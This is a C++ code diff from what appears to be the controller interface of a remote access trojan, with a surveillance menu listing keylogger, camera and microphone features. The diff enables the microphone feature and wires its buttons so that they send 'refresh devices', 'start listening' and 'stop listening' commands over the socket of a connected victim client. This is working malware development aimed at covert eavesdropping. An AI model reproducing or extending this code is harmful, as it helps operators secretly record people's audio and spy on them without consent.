@@ -68,9 +68,9 @@ FrameCliente::FrameCliente(std::string strID, SOCKET sckID, std::string strIP)
 
     this->m_tree->AppendItem(rootSurveilance, wxT("Keylogger"));
     this->m_tree->AppendItem(rootSurveilance, wxT("Camara"));
-    /*this->m_tree->AppendItem(rootSurveilance, wxT("Microfono"));
+    this->m_tree->AppendItem(rootSurveilance, wxT("Microfono"));
     
-    this->m_tree->AppendItem(rootMisc, wxT("Testing"));*/
+    /*this->m_tree->AppendItem(rootMisc, wxT("Testing"));*/
     
     this->m_tree->p_Notebook = new wxAuiNotebook(pnl_Right, wxID_ANY, wxDefaultPosition, wxSize(FRAME_CLIENT_SIZE_WIDTH, 450),
         wxAUI_NB_CLOSE_ON_ACTIVE_TAB | wxAUI_NB_DEFAULT_STYLE | wxAUI_NB_TAB_EXTERNAL_MOVE | wxNO_BORDER);
@@ -275,6 +275,7 @@ panelMicrophone::panelMicrophone(wxWindow* pParent) :
             FrameCliente* frame_cliente = (FrameCliente*)panel_cliente->GetParent();
             if (frame_cliente) {
                 this->strID = frame_cliente->strClienteID;
+                this->sckSocket = frame_cliente->sckCliente;
             }
         }
     }
@@ -314,7 +315,7 @@ void panelMicrophone::OnRefrescarDispositivos(wxCommandEvent& event) {
     std::string strComando = std::to_string(EnumComandos::Mic_Refre_Dispositivos);
     strComando.append(1, CMD_DEL);
     strComando.append(1, '0');
-    //this->EnviarComando(strComando);
+    this->EnviarComando(strComando);
 }
 
 void panelMicrophone::OnEscuchar(wxCommandEvent& event) {
@@ -327,19 +328,15 @@ void panelMicrophone::OnEscuchar(wxCommandEvent& event) {
     //Quien tiene mas de 10 microfonos :v ?
     strComando.append(1, str_device_id[1]);
 
-    //this->EnviarComando(strComando);
+    this->EnviarComando(strComando);
 }
 
 void panelMicrophone::OnDetener(wxCommandEvent& event) {
     std::string strComando = std::to_string(EnumComandos::Mic_Detener_Escucha);
     strComando.append(1, CMD_DEL);
-    //this->EnviarComando(strComando);
+    this->EnviarComando(strComando);
 }
 
 void panelMicrophone::EnviarComando(std::string pComando) {
-    int iTempID = atoi(this->strID.substr(this->strID.size() - 3, 3).c_str());
-    auto aClient = p_Servidor->um_Clientes.find(iTempID);
-    if (aClient != p_Servidor->um_Clientes.end()) {
-        p_Servidor->cSend(aClient->second._sckCliente, pComando.c_str(), pComando.size() + 1, 0, false);
-    }
+    p_Servidor->cSend(this->sckSocket, pComando.c_str(), pComando.size() + 1, 0, false);
 }
